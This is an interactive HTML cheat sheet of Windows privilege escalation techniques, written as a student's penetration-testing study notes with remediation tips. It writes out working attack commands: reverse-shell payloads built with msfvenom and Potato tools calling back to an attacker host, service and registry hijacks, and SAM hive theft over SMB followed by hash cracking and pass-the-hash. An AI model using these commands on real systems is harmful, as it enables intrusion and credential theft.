@@ -1,1 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Windows PrivEsc Attack Map // Red</title>
+<style>
+  :root{
+    --bg:#0b1220; --panel:#111c2e; --panel2:#0f1829; --line:#1e2d44;
+    --teal:#2dd4bf; --teal-d:#0f766e; --purple:#a78bfa; --purple-d:#6b21a8;
+    --amber:#fbbf24; --red:#f87171; --green:#34d399;
+    --txt:#e5edf5; --muted:#8aa0b8; --code:#7fe3d4;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.55;padding-bottom:60px}
+  .wrap{max-width:1180px;margin:0 auto;padding:0 16px}
 
+  header{padding:34px 0 18px;border-bottom:1px solid var(--line);margin-bottom:22px;
+    background:radial-gradient(900px 300px at 20% -40%, rgba(45,212,191,.12), transparent),
+               radial-gradient(700px 260px at 90% -60%, rgba(167,139,250,.12), transparent)}
+  h1{font-size:30px;font-weight:800;letter-spacing:.3px;line-height:1.15}
+  h1 .by{color:var(--teal);font-weight:600}
+  .tag{display:inline-block;margin-top:4px;color:var(--purple);font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px}
+  .sub{color:var(--muted);margin-top:12px;max-width:760px;font-size:15px}
+
+  .ladder{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin:18px 0 4px;font-size:13px}
+  .rung{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:6px 12px;font-family:ui-monospace,monospace}
+  .rung.sys{border-color:var(--teal-d);color:var(--teal);box-shadow:0 0 0 1px rgba(45,212,191,.2) inset}
+  .arrow{color:var(--muted)}
+
+  .controls{display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin:24px 0 10px;position:sticky;top:0;background:linear-gradient(var(--bg) 70%, transparent);padding:10px 0;z-index:5}
+  #search{flex:1;min-width:220px;background:var(--panel2);border:1px solid var(--line);color:var(--txt);
+    padding:11px 14px;border-radius:10px;font-size:15px;outline:none}
+  #search:focus{border-color:var(--teal-d);box-shadow:0 0 0 2px rgba(45,212,191,.15)}
+  .count{color:var(--muted);font-size:13px;white-space:nowrap}
+  .filters{display:flex;gap:6px;flex-wrap:wrap}
+  .chip{cursor:pointer;background:var(--panel);border:1px solid var(--line);color:var(--muted);
+    padding:7px 12px;border-radius:20px;font-size:13px;user-select:none;transition:.15s}
+  .chip:hover{color:var(--txt)}
+  .chip.on{background:var(--teal-d);border-color:var(--teal);color:#fff}
+
+  .cat{margin:30px 0 8px;display:flex;align-items:center;gap:10px}
+  .cat h2{font-size:19px;font-weight:700}
+  .cat .ico{font-size:22px}
+  .cat .desc{color:var(--muted);font-size:13px}
+  .cat .line{flex:1;height:1px;background:var(--line)}
+
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px;margin-top:14px}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.18s}
+  .card:hover{border-color:var(--teal-d);transform:translateY(-2px)}
+  .card .head{padding:16px 18px;cursor:pointer;display:flex;justify-content:space-between;align-items:flex-start;gap:10px}
+  .card .t{font-weight:700;font-size:16px}
+  .card .tell{color:var(--muted);font-size:13px;margin-top:5px}
+  .card .plus{color:var(--teal);font-size:20px;line-height:1;transition:.2s;flex-shrink:0}
+  .card.open .plus{transform:rotate(45deg)}
+  .badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:20px;margin-top:9px;font-family:ui-monospace,monospace;border:1px solid}
+  .b-door{color:var(--teal);border-color:var(--teal-d);background:rgba(45,212,191,.08)}
+  .b-badge{color:var(--purple);border-color:var(--purple-d);background:rgba(167,139,250,.08)}
+  .b-cred{color:var(--amber);border-color:#92400e;background:rgba(251,191,36,.08)}
+
+  .body{max-height:0;overflow:hidden;transition:max-height .3s ease}
+  .card.open .body{max-height:1400px}
+  .body .inner{padding:2px 18px 18px;border-top:1px solid var(--line)}
+  .sec{margin-top:14px}
+  .sec .lbl{font-size:12px;text-transform:uppercase;letter-spacing:.6px;color:var(--purple);font-weight:700;margin-bottom:5px}
+  .sec p{font-size:14px;color:#cdd9e5}
+  ol.steps{margin:4px 0 0 2px;padding-left:18px}
+  ol.steps li{font-size:14px;margin:3px 0;color:#cdd9e5}
+  pre{background:#07101d;border:1px solid var(--line);border-left:3px solid var(--teal-d);border-radius:8px;
+    padding:11px 13px;overflow-x:auto;margin-top:6px}
+  code{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px;color:var(--code);white-space:pre}
+  .rem{color:var(--green)}
+  .rem .lbl{color:var(--green)}
+
+  footer{margin-top:46px;border-top:1px solid var(--line);padding-top:22px;color:var(--muted);font-size:13px}
+  footer a{color:var(--teal)}
+  footer .lic{margin-top:8px}
+  .hidden{display:none!important}
+  .nores{color:var(--muted);padding:30px 4px;font-style:italic}
+</style>
+</head>
+<body>
+<header>
+  <div class="wrap">
+    <h1>Windows Privilege Escalation <span class="by">// Attack Map · Red</span></h1>
+    <div class="tag">standard user &rarr; administrator &rarr; nt authority\system</div>
+    <p class="sub">The Windows privesc techniques I've worked through, organised the way I actually think about them: <b>doors</b> you can walk through (permission misconfigs), <b>badges</b> you can wear (token privileges), and <b>credentials</b> left lying around. Click any card for the concept, the tell, the attack chain and the commands. Everything here is generic methodology from public labs &mdash; nothing about the real PNPT exam (NDA).</p>
+    <div class="ladder">
+      <span class="rung">Standard User</span><span class="arrow">&rarr;</span>
+      <span class="rung">Administrator</span><span class="arrow">&rarr;</span>
+      <span class="rung sys">SYSTEM 👑</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="controls">
+    <input id="search" placeholder="Search techniques, tells, commands…  (try: SeImpersonate, SAM, >>, accesschk)" autocomplete="off">
+    <div class="filters">
+      <span class="chip on" data-f="all">All</span>
+      <span class="chip" data-f="door">🚪 Doors</span>
+      <span class="chip" data-f="badge">🎫 Badges</span>
+      <span class="chip" data-f="cred">🔑 Credentials</span>
+    </div>
+    <span class="count" id="count"></span>
+  </div>
+
+  <div id="map"></div>
+  <div class="nores hidden" id="nores">No techniques match that search.</div>
+
+  <footer>
+    <div>Built by <b>Red</b> as part of my PNPT prep &mdash; notes and methodology from doing the labs myself. Built with AI assistance for formatting and this interactive map.</div>
+    <div class="lic">Licensed <b>CC BY-NC 4.0</b> &mdash; free to use and share with credit, not for sale. · Core principle: <i>something runs with power + you control what it runs = you inherit its power.</i></div>
+  </footer>
+</div>
+
+<script>
+const DATA = [
+  // ===================== DOORS =====================
+  {cat:"door", t:"Insecure Service Permissions", tell:"You can reconfigure a service that runs as SYSTEM.",
+   concept:"A Windows service runs as SYSTEM. If your user has permission to change its configuration, you can point it at your own payload. When the service (re)starts, SYSTEM runs your file.",
+   spot:"accesschk on the service shows SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS for your user.",
+   steps:["Enumerate service permissions with accesschk","Rewrite the service binary path to your reverse shell","Restart the service — it runs your payload as SYSTEM"],
+   cmd:`accesschk.exe /accepteula -uwcqv user <service>
+sc config <service> binpath= "\\"C:\\PrivEsc\\reverse.exe\\""
+sc stop <service> & sc start <service>`,
+   rem:"Least privilege on service ACLs — normal users should never have SERVICE_CHANGE_CONFIG."},
+
+  {cat:"door", t:"Unquoted Service Path", tell:"A service path has spaces and no quotes.",
+   concept:"If a service's executable path contains spaces and isn't quoted, Windows tries each partial path in turn. Drop an exe at an earlier spot it tests, and SYSTEM runs yours instead.",
+   spot:"wmic shows a service BINARY_PATH_NAME with spaces and no quotes, e.g. C:\\Program Files\\My App\\svc.exe.",
+   steps:["Find unquoted paths you can write into","Plant your exe at the earlier interrupted name (e.g. C:\\Program.exe or C:\\Program Files\\My.exe)","Restart the service → SYSTEM runs your exe"],
+   cmd:`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"
+copy reverse.exe "C:\\Program Files\\My.exe"
+sc stop <service> & sc start <service>`,
+   rem:"Always quote service binary paths; restrict write access to the folders in the path."},
+
+  {cat:"door", t:"Weak Registry Permissions", tell:"You can edit a service's registry key.",
+   concept:"A service's config lives under HKLM. If your user can write to that registry key, you can change the ImagePath to your payload — same result as changing the service config.",
+   spot:"accesschk on the service's registry key shows KEY_WRITE / KEY_ALL_ACCESS for your user.",
+   steps:["Check write access on HKLM\\...\\Services\\<service>","Overwrite ImagePath with your reverse shell","Restart the service → SYSTEM"],
+   cmd:`accesschk.exe /accepteula -uvwqk "HKLM\\System\\CurrentControlSet\\Services\\<service>"
+reg add "HKLM\\System\\CurrentControlSet\\Services\\<service>" /v ImagePath /t REG_EXPAND_SZ /d "C:\\PrivEsc\\reverse.exe" /f`,
+   rem:"Lock down registry ACLs on service keys; audit non-default permissions."},
+
+  {cat:"door", t:"Insecure Service Executable", tell:"You can overwrite the service's .exe itself.",
+   concept:"Even with locked config, if the service's actual executable file is writable by you, replace it with your payload. Next start, SYSTEM runs your file.",
+   spot:"accesschk on the service binary shows FILE_ALL_ACCESS / write for your user.",
+   steps:["Back up the original exe","Overwrite it with your reverse shell","Restart the service → SYSTEM"],
+   cmd:`accesschk.exe /accepteula -quvw user "C:\\path\\to\\service.exe"
+copy reverse.exe "C:\\path\\to\\service.exe" /y
+sc stop <service> & sc start <service>`,
+   rem:"Restrict write access on service binaries; run services from protected directories."},
+
+  {cat:"door", t:"Registry AutoRuns", tell:"A writable program runs on every admin login.",
+   concept:"Programs listed under the Run registry keys launch automatically when a user logs in. If an autorun exe is writable by you, overwrite it — next time an admin logs in, your payload runs with their rights.",
+   spot:"accesschk shows write access to an exe referenced in HKLM\\...\\CurrentVersion\\Run.",
+   steps:["List autorun entries","Overwrite a writable autorun exe with your payload","Wait for an interactive admin logon → your shell runs as admin"],
+   cmd:`reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+accesschk.exe /accepteula -quvw user "C:\\path\\autorun.exe"
+copy reverse.exe "C:\\path\\autorun.exe" /y`,
+   rem:"Protect autorun binaries; note this needs an interactive admin logon (social engineering in the real world)."},
+
+  {cat:"door", t:"AlwaysInstallElevated", tell:"MSI installers run as SYSTEM for everyone.",
+   concept:"If both HKCU and HKLM have AlwaysInstallElevated = 1, any .msi you run installs with SYSTEM privileges. Build a malicious MSI and run it.",
+   spot:"Both registry values read 0x1 — the attack only works if BOTH are set.",
+   steps:["Confirm both HKCU and HKLM keys = 1","Build a reverse-shell MSI with msfvenom","Run it → SYSTEM"],
+   cmd:`reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f msi -o reverse.msi
+msiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi`,
+   rem:"Never enable AlwaysInstallElevated via Group Policy — it is elevation-for-everyone."},
+
+  {cat:"door", t:"Scheduled Tasks", tell:"A SYSTEM task runs a script you can write to.",
+   concept:"A script runs on a timer (e.g. every minute) as SYSTEM. If you can write to that script, append a line that runs your reverse shell. When the task fires, SYSTEM runs your line. The Windows twin of Linux cron.",
+   spot:"accesschk shows RW / FILE_APPEND_DATA on the scheduled script; the script comment or task says it runs as SYSTEM.",
+   steps:["Read the script (type) — confirm it runs as SYSTEM on a timer","accesschk → confirm you can write to it","Start a listener on Kali FIRST","Append your reverse.exe line with >> ","Wait ≤60s → SYSTEM"],
+   cmd:`type C:\\DevTools\\CleanUp.ps1
+accesschk.exe /accepteula -quvw user C:\\DevTools\\CleanUp.ps1
+# Kali: nc -nvlp 4444   (listener FIRST)
+echo C:\\PrivEsc\\reverse.exe >> C:\\DevTools\\CleanUp.ps1
+# wait up to 60s → whoami = nt authority\\system`,
+   rem:"Restrict write access to scheduled scripts; don't run tasks as SYSTEM when a lower account will do."},
+
+  {cat:"door", t:"Startup Apps", tell:"You can drop an exe into the Startup folder.",
+   concept:"Anything in the Startup folder runs at logon. If the folder is writable by your user, plant a shortcut/exe — next logon runs it with that user's rights (SYSTEM/admin if an admin logs in).",
+   spot:"accesschk shows write access to the All Users Startup folder.",
+   steps:["Confirm write access to the Startup directory","Place your payload (or a .lnk to it) there","Wait for a logon → your shell runs"],
+   cmd:`accesschk.exe /accepteula -quvw user "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
+copy reverse.exe "C:\\ProgramData\\...\\StartUp\\reverse.exe"`,
+   rem:"Lock down the All-Users Startup folder to admins only."},
+
+  {cat:"door", t:"Insecure GUI Apps", tell:"An app running as admin lets you spawn a shell.",
+   concept:"A GUI app running with high privileges that exposes a file dialog, help window or 'open location' feature can be abused to launch cmd.exe — inheriting the app's privilege level.",
+   spot:"An app running as admin/SYSTEM with any way to reach a file browser or URL.",
+   steps:["Find a high-priv GUI app with a dialog/open feature","Use it to open a file-browser path and launch cmd.exe","You get a shell at the app's privilege level"],
+   cmd:`# e.g. in an open/save dialog address bar:
+C:\\Windows\\System32\\cmd.exe`,
+   rem:"Don't run GUI apps as admin; strip file-dialog access from elevated apps."},
+
+  {cat:"door", t:"PrivEsc Enumeration Scripts", tell:"Automated tools find the doors for you.",
+   concept:"Before manual hunting, run an enumeration script to surface misconfigurations fast: writable services, autoruns, saved creds, unquoted paths and more. Run it ON the target after you have a foothold.",
+   spot:"You have a low-priv shell and want a prioritised list of privesc leads.",
+   steps:["Transfer the script to the target","Run it from your low-priv shell","Work the highest-confidence findings first"],
+   cmd:`# winPEAS (C# or .bat), PowerUp, Seatbelt, accesschk
+.\\winPEASx64.exe
+powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"`,
+   rem:"Defenders: EDR flags these; monitor for enumeration tooling on endpoints."},
+
+  // ===================== BADGES =====================
+  {cat:"badge", t:"Token Impersonation — Potato", tell:"SeImpersonatePrivilege → steal a SYSTEM token.",
+   concept:"A 'badge' attack. If your account holds SeImpersonatePrivilege, you can coerce a SYSTEM process to authenticate to you, then impersonate (wear) its token — becoming SYSTEM. The Potato family automates the coercion.",
+   spot:"whoami /priv shows SeImpersonatePrivilege (or SeAssignPrimaryTokenPrivilege) Enabled. Trigger: 'see SeImpersonate → Potato → SYSTEM'.",
+   steps:["whoami /priv → confirm SeImpersonate","Run a Potato (RoguePotato / PrintSpoofer / GodPotato) pointing at your reverse shell","Catch a SYSTEM shell"],
+   cmd:`whoami /priv
+# RoguePotato (needs a socat redirector on Kali for port 135)
+C:\\PrivEsc\\RoguePotato.exe -r <KALI_IP> -e "C:\\PrivEsc\\reverse.exe" -l 9999
+# or PrintSpoofer
+C:\\PrivEsc\\PrintSpoofer.exe -i -c "C:\\PrivEsc\\reverse.exe"`,
+   rem:"Remove SeImpersonate from service accounts where possible; patch; use least privilege for service identities."},
+
+  // ===================== STORED CREDENTIALS =====================
+  {cat:"cred", t:"Passwords in Registry (AutoLogon)", tell:"Plaintext password stored for auto-login.",
+   concept:"Windows AutoLogon must replay the real password to log in automatically, so it stores it in PLAINTEXT under the winlogon registry key (a hash can't be replayed). Read it, log in as that user.",
+   spot:"reg query of the winlogon key shows DefaultPassword alongside DefaultUserName and AutoAdminLogon=1.",
+   steps:["Search the registry for stored passwords","Read the winlogon key directly","Log in / run as that account"],
+   cmd:`reg query HKLM /f password /t REG_SZ /s
+reg query "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"
+# then use the creds: psexec.py user:pass@<TARGET>`,
+   rem:"Don't use AutoLogon; if required, use the LSA secrets method, not plaintext registry."},
+
+  {cat:"cred", t:"Saved Credentials (runas)", tell:"Stored creds you can USE but not read.",
+   concept:"Windows Credential Manager can store an admin credential. You can't read the password, but you can RUN programs as that account with runas /savecred — like a valet key.",
+   spot:"cmdkey /list shows a saved credential (Type: Domain Password).",
+   steps:["List saved creds with cmdkey","runas /savecred to launch your reverse shell as the saved admin","Catch the shell"],
+   cmd:`cmdkey /list
+# transfer reverse.exe, start listener, then:
+runas /savecred /user:admin C:\\PrivEsc\\reverse.exe`,
+   rem:"Don't store privileged creds in Credential Manager on shared/low-trust hosts."},
+
+  {cat:"cred", t:"SAM + SYSTEM Dump", tell:"Steal the local hash database, crack offline.",
+   concept:"The SAM stores local account password HASHES; it's LOCKED while Windows runs and ENCRYPTED with the key in the SYSTEM hive — so you need BOTH files. Grab backup copies, pull them to Kali, dump, crack.",
+   spot:"Readable hive backups in C:\\Windows\\Repair\\ or RegBack — a misconfiguration.",
+   steps:["Copy SAM + SYSTEM backups to Kali over SMB","Dump hashes with secretsdump","Crack the NT hash (4th field) with hashcat","Log in"],
+   cmd:`# Kali receiver: smbserver.py share . -smb2support -user red -password red
+# Windows: net use \\\\<KALI_IP>\\share /user:red red
+copy C:\\Windows\\Repair\\SAM    \\\\<KALI_IP>\\share\\
+copy C:\\Windows\\Repair\\SYSTEM \\\\<KALI_IP>\\share\\
+# Kali:
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+hashcat -m 1000 <NThash> /usr/share/wordlists/rockyou.txt`,
+   rem:"Remove readable hive backups; unique local admin passwords (LAPS); Credential Guard."},
+
+  {cat:"cred", t:"Pass-the-Hash", tell:"Reuse a hash — no cracking needed.",
+   concept:"NTLM accepts the HASH as proof of identity, so a stolen hash IS the credential. Authenticate directly without ever knowing the password. hashcat wants the NT hash only; Pass-the-Hash wants the FULL LM:NT.",
+   spot:"You have an NT hash and want a shell, or to pivot to another box that shares the local admin password.",
+   steps:["Take the full LM:NT hash","psexec/secretsdump with -hashes to get a shell or dump the next box","Pivot machine to machine up to Domain Admin"],
+   cmd:`# shell on the box:
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> admin@<TARGET>
+# dump the NEXT box's hashes (the pivot):
+secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> admin@<TARGET>`,
+   rem:"Unique local admin passwords (LAPS) so one hash opens one box; Credential Guard; restrict lateral movement."},
+];
+
+const CATMETA = {
+  door:{ico:"🚪", name:"Doors — Permission Misconfigurations", desc:"Something runs with power and you can change what it runs."},
+  badge:{ico:"🎫", name:"Badges — Token Privileges", desc:"A privilege you carry that lets you wear another identity."},
+  cred:{ico:"🔑", name:"Stored Credentials", desc:"Passwords and hashes left where a low-priv user can reach them."}
+};
+const BCLASS = {door:"b-door", badge:"b-badge", cred:"b-cred"};
+const BNAME  = {door:"DOOR", badge:"BADGE", cred:"CREDENTIAL"};
+
+const map = document.getElementById('map');
+const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+function render(){
+  map.innerHTML='';
+  let order=['door','badge','cred'];
+  order.forEach(cat=>{
+    const items = DATA.filter(d=>d.cat===cat);
+    const meta = CATMETA[cat];
+    const sec = document.createElement('section');
+    sec.dataset.cat=cat;
+    sec.innerHTML = `<div class="cat"><span class="ico">${meta.ico}</span>
+        <h2>${meta.name}</h2><span class="line"></span></div>
+        <div class="cat"><span class="desc">${meta.desc}</span></div>
+        <div class="grid"></div>`;
+    const grid = sec.querySelector('.grid');
+    items.forEach(d=>{
+      const card=document.createElement('div');
+      card.className='card';
+      card.dataset.cat=d.cat;
+      card.dataset.text=(d.t+' '+d.tell+' '+d.concept+' '+d.spot+' '+d.cmd).toLowerCase();
+      card.innerHTML=`
+        <div class="head">
+          <div>
+            <div class="t">${d.t}</div>
+            <div class="tell">${d.tell}</div>
+            <span class="badge ${BCLASS[d.cat]}">${BNAME[d.cat]}</span>
+          </div>
+          <div class="plus">+</div>
+        </div>
+        <div class="body"><div class="inner">
+          <div class="sec"><div class="lbl">Concept</div><p>${d.concept}</p></div>
+          <div class="sec"><div class="lbl">The tell</div><p>${d.spot}</p></div>
+          <div class="sec"><div class="lbl">Attack chain</div><ol class="steps">${d.steps.map(s=>`<li>${s}</li>`).join('')}</ol></div>
+          <div class="sec"><div class="lbl">Key commands</div><pre><code>${esc(d.cmd)}</code></pre></div>
+          <div class="sec rem"><div class="lbl">Remediation</div><p>${d.rem}</p></div>
+        </div></div>`;
+      card.querySelector('.head').addEventListener('click',()=>card.classList.toggle('open'));
+      grid.appendChild(card);
+    });
+    map.appendChild(sec);
+  });
+  applyFilters();
+}
+
+let activeFilter='all';
+const search=document.getElementById('search');
+const countEl=document.getElementById('count');
+const nores=document.getElementById('nores');
+
+function applyFilters(){
+  const q=search.value.trim().toLowerCase();
+  let shown=0;
+  document.querySelectorAll('.card').forEach(c=>{
+    const okCat = activeFilter==='all' || c.dataset.cat===activeFilter;
+    const okQ = !q || c.dataset.text.includes(q);
+    const vis = okCat && okQ;
+    c.classList.toggle('hidden', !vis);
+    if(vis) shown++;
+  });
+  document.querySelectorAll('#map section').forEach(s=>{
+    const any=[...s.querySelectorAll('.card')].some(c=>!c.classList.contains('hidden'));
+    s.classList.toggle('hidden', !any);
+  });
+  countEl.textContent = shown+' / '+DATA.length+' techniques';
+  nores.classList.toggle('hidden', shown>0);
+}
+
+search.addEventListener('input', applyFilters);
+document.querySelectorAll('.chip').forEach(ch=>{
+  ch.addEventListener('click',()=>{
+    document.querySelectorAll('.chip').forEach(x=>x.classList.remove('on'));
+    ch.classList.add('on');
+    activeFilter=ch.dataset.f;
+    applyFilters();
+  });
+});
+
+render();
+</script>
+</body>
+</html>
